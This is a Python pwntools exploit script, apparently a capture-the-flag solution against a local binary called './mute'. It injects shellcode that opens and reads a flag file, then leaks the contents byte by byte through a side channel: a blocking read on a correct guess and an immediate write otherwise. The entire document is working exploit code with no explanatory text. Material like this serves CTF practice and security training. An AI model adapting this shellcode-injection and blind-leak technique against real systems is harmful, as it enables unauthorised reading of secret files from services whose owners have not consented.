from pwn import *
 
context.binary = "./mute"
#context.log_level = "debug"
 
debug = False
flag = ''
prog = log.progress("Get flag.... ")
 
 
for i in xrange(200):
    for byte in xrange(32, 127):
 
        p = process(["./mute"])
        #log.warn("pid : " + str(proc.pidof(p)[0]))
        #pause()
    
        p.recvline()
 
        sc = asm(shellcraft.open("./flag"))
        sc += asm('''
                xor r14, r14
                xor r15, r15
                mov r15, rsp
                sub r15, 0x800
            ''')
        sc += asm(shellcraft.read("rax", "r15", 200))
        sc += asm('''
                xor rsi, rsi
                xor rdi, rdi
                mov sil, byte ptr [r15+'''+str(i)+''']
                mov dil, ''' + hex(byte) + '''
                cmp sil, dil
                je correct
                jmp wrong
                correct:
                mov rax, 0
                mov rdi, 1
                mov rsi, rsp
                mov rdx, 100
                syscall
                wrong:
                mov rax, 1
                mov rdi, 1
                mov rsi, rsp
                mov rdx, 100
                syscall
            ''')
        try:
            p.sendline(sc + "A" * (4096 - len(sc)))
            p.recv(timeout=0.5)
            flag += chr(byte)
            log.success(flag)
        except:
            p.close()
 
 
log.success(flag)
